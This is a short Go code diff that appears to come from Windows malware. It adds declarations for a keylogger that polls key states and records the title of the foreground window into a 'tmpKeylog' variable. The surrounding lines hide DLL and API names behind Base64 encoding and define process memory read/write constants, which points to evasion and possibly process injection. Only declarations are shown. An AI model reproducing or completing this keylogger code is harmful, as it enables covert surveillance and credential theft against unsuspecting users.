@@ -11,6 +11,12 @@ const PROCESS_VM_OPERATION = 0x0008
 const PROCESS_VM_WRITE = 0x0020
 const PROCESS_VM_READ = 0x0010
 
+var user32 = syscall.NewLazyDLL("user32.dll")
+var procGetAsyncKeyState = user32.NewProc("GetAsyncKeyState")
+var procGetForegroundWindow = user32.NewProc("GetForegroundWindow") //GetForegroundWindow
+var procGetWindowTextW = user32.NewProc("GetWindowTextW")           //GetWindowTextW
+var tmpKeylog string
+
 var K32 = syscall.MustLoadDLL(Base64Decode("a2VybmVsMzIuZGxs"))
 var USER32 = syscall.MustLoadDLL(Base64Decode("dXNlcjMyLmRsbA=="))
 var GetAsyncKeyState = USER32.MustFindProc(Base64Decode("R2V0QXN5bmNLZXlTdGF0ZQ=="))
